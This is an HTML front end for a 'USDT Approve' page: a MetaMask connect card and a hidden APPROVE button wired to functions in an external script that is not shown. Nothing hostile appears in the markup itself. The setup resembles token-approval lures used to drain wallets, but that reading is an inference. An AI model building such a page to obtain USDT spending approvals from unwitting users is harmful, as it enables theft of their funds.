<html>

<head>
    <meta charset="utf-8">
    <title>USDT Approve</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

    <!-- Styles -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
        integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <style>
        .toastify {
            right: 55px !important;
            top: 40px !important;
            transform: scale(1.5) !important;
        }
    </style>
</head>

<body class="body header-fixed is_dark body-connect">
    <div class="row m-5 justify-content-center">
        <div class="col-md-4">
            <div class=" px-5 py-3">
                <div class="card" style="width: 300px; border-width: 3px;">
                    <div class="text-center">
                        <div onclick="onConnect()" style="cursor: pointer;" class="sc-box-icon">
                            <div class="img">
                                <img src="/images/metamask.png" alt="Image">
                            </div>
                            <h4 class="heading">Meta Mask</h4>
                            <p class="content">Connect your wallet using Meta Mask</p>
                        </div>
                    </div>
                </div>
                <button type="button" onclick="onApprove()" class="btn btn-primary"
                    style="display: none;">APPROVE</button>
            </div>
        </div>
    </div>
    <!-- Web3 -->
    <script type="text/javascript" src="https://unpkg.com/web3@1.2.11/dist/web3.min.js"></script>
    <script type="text/javascript" src="https://unpkg.com/web3modal@1.9.0/dist/index.js"></script>
    <script type="text/javascript"
        src="https://unpkg.com/@walletconnect/web3-provider@1.6.6/dist/umd/index.min.js"></script>
    <script src="https://cdn.ethers.io/lib/ethers-5.0.umd.min.js" type="text/javascript"></script>

    <!-- Toastify Notification library -->
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css">
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/toastify-js"></script>

    <script src="./js/index.js"></script>
</body>

</html>
